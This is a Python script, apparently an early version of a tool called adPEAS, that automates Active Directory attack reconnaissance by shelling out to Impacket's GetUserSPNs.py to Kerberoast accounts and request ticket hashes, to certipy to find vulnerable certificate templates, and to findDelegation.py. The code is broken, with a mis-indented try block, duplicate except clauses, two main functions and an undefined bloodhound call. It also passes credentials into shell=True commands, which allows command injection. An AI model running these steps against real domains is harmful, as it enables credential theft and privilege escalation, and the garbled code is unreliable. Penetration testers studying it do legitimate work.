import argparse
import getpass
import subprocess
from ldap3 import Server, Connection, SUBTREE
import sys

if sys.version_info >= (3, 8):
    from importlib import metadata
else:
    import importlib_metadata as metadata

def find_and_kerberoast_objects(username, password, domain, dc_ip):
    try:
        # Connect to the Domain Controlle
            cmd = f"GetUserSPNs.py -dc-ip {dc_ip} {domain}/{username}:{password} -request"
            subprocess.run(cmd, shell=True)
    except Exception as e:
        print(f"Error while searching for kerberoastable objects or Kerberoasting: {e}")
def certipy(username, password, domain, dc_ip):
     try:
          cmd = f"certipy find -u {username}@{domain} -p {password} -dc-ip {dc_ip} -enabled -vulnerable -stdout"
          subprocess.run(cmd, shell=True)
     except Exception as e:
        print(f"Error while running Certipy: {e}")
def findDelegation(username, password, domain, dc_ip):
     try:
          cmd = f"findDelegation.py -dc-ip {dc_ip} {domain}/{username}:{password}"
          subprocess.run(cmd, shell=True)
     except Exception as e:
          print(f"Error while finding delegation: {e}")
     except Exception as e:
          print(f"Error running BloodHound: {e}")

def main():
     # Example usage:
     username = input("Enter username: ")
     password = input("Enter password: ")
     domain = input("Enter domain: ")
     dc_ip = input("Enter domain controller IP or hostname: ")
def main(arguments=None):
     adPEAS_version = metadata.version('adPEAS')
     parser = argparse.ArgumentParser("adPEAS")
     parser.add_argument('--version', action='version', version=f"v{adPEAS_version}")
     parser.add_argument("-u", "--username", required=True, help="Username for log in.")
     parser.add_argument("-p", "--password", help="Password for log in. Will prompt if not specified.")
     parser.add_argument("-d", "--domain", required=True, help="Domain of the DC.")
     parser.add_argument("-i", "--dc-ip", required=True, help="Domain Controller IP or hostname.")
     if arguments is None:
          args = parser.parse_args()
     else:
          args = parser.parse_args(arguments)

     print(f"Welcome to adPEAS v{adPEAS_version}!")

     domain = args.domain
     dc_ip = args.dc_ip
     username = args.username
     password = args.password if args.password else getpass.getpass()

     print("Welcome to adPEAS v1.0.0!")
     print("Attempting to kerberoast the domain...")
     find_and_kerberoast_objects(username, password, domain, dc_ip)
     print("Kerberoasting done!")
     print("Collecting information for BloodHound...")
     bloodhound(username, password, domain, dc_ip)
     print("Dome collecting bloodhound information.")
     print("Attempting to find all ADCS infrastructure...")
     certipy(username, password, domain, dc_ip)
     print("Done finding all ADCS infrastructure")
     print("Attempting to find all delegation...")
     findDelegation(username, password, domain, dc_ip)
     print("Done finding all delegation.")
     #todo: auto open certipy output and grep for ESCs 